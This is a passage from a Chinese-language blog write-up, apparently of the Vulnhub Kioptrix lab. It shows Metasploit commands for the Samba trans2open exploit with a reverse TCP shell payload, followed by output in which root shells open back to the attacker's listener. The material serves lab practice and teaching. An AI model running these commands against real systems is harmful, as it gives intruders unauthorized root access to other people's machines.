+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/samba/trans2open</span><br><span class="line">set payload linux/x86/shell_reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set rhosts 192.168.1.102</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.106:4444</span><br><span class="line">[*] 192.168.1.102:139 - Trying return address 0xbffffdfc...</span><br><span class="line">[*] 192.168.1.102:139 - Trying return address 0xbffffcfc...</span><br><span class="line">[*] 192.168.1.102:139 - Trying return address 0xbffffbfc...</span><br><span class="line">[*] 192.168.1.102:139 - Trying return address 0xbffffafc...</span><br><span class="line">[*] 192.168.1.102:139 - Trying return address 0xbffff9fc...</span><br><span class="line">[*] 192.168.1.102:139 - Trying return address 0xbffff8fc...</span><br><span class="line">[*] Command shell session 1 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1036) at 2021-11-13 07:04:24 -0500</span><br><span class="line"></span><br><span class="line">[*] Command shell session 2 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1037) at 2021-11-13 07:04:25 -0500</span><br><span class="line">[*] Command shell session 3 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1038) at 2021-11-13 07:04:26 -0500</span><br><span class="line">whoami&amp;&amp;id</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) groups=99(nobody)</span><br></pre></td></tr></table></figure>
+
+<p>用msf的模块打就是root，至于为啥我也没研究出个所以然来（主要因为菜）</p>
+<p>知道原因的小伙伴可以告诉我一下</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lucifiel</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.lucifiel.com/2021/11/13/Kioptrix/">http://www.lucifiel.com/2021/11/13/Kioptrix/</a></span>
+                    </p>
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/05/05/Overpass/">TryHackMe - Overpass 靶场实战</a>
+            
+            
+            <a class="next" rel="next" href="/2021/10/17/Chill_Hack/">Vulnhub - Chill_Hack 靶场实战</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Lucifiel | Powered by Lucifiel</span>
+    </div>
+</footer>
+    </div>
+</body>
+
+</html>
